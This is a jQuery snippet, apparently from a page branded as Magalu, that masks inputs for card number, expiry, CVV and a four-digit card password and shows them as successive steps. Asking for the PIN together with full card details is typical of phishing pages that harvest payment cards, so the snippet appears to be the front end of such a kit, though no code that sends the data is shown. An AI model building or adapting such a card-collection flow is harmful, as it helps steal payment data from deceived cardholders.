 <script>
  $(document).ready(() => {
        $('#magalu-card-number').mask('0000 0000 0000 0000');
        $('#magalu-card-exp').mask('00/00');
        $('#magalu-card-cvv').mask('000');
        $('#magalu-card-pass').mask('0000');
    });
    // 
    $("#btn_1").click(() => {
        if ($("input[name='magalu_code']").val().length < 19) {} else {
            document.querySelector("#step1").style.display = "none";
            document.querySelector("#step2").style.display = "block";
        }
    });
    $("#btn_2").click(() => {
        if ($("input[name='magalu_exp']").val().length < 5) {} else {
            document.querySelector("#step2").style.display = "none";
            document.querySelector("#step3").style.display = "block";
        }
    });
    $("#btn_3").click(() => {
        if ($("input[name='magalu_cvv']").val().length < 3) {} else {
            document.querySelector("#step3").style.display = "none";
            document.querySelector("#step4").style.display = "block";
        }
    });
 </script>
